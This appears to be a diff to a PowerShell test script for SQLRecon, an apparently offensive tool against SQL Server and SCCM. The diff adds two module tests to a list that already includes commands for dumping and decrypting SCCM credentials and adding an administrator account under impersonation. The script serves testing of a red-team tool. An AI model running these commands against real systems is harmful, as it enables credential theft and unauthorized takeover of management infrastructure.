@@ -10,7 +10,7 @@
 #>
 $global:timeout = 1
 $global:count = 1
-$global:modules = 20
+$global:modules = 22
 $global:timestamp = Get-Date -Format "MM-dd-yyyy-HH-mm"
 
 <#
@@ -73,7 +73,7 @@ Write-Output "[+] Starting test cases against $modules modules at $global:timest
 Write-Output "---------------------------------------------------------------------"
 Write-Output ""
 
-# Add test cases in this area. In this case there are 20, which is why $global:modules is set to 20.
+# Add test cases in this area. In this case there are 22, which is why $global:modules is set to 22.
 Execute "$sqlreconPath /auth:$authentication /host:$server /database:$database /sccm:users"
 Execute "$sqlreconPath /auth:$authentication /host:$server /database:$database /sccm:sites"
 Execute "$sqlreconPath /auth:$authentication /host:$server /database:$database /sccm:logons"
@@ -96,6 +96,8 @@ Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /
 Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:tasklist"
 Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:taskdata"
 Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:credentials"
+Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:scriptdata"
+Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:cidata"
 Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:decryptcredentials"
 Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:addadmin /user:current /sid:current"
 Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:addadmin /user:KAWALABS\acon /sid:S-1-5-21-3113994310-608060616-2731373765-1391"
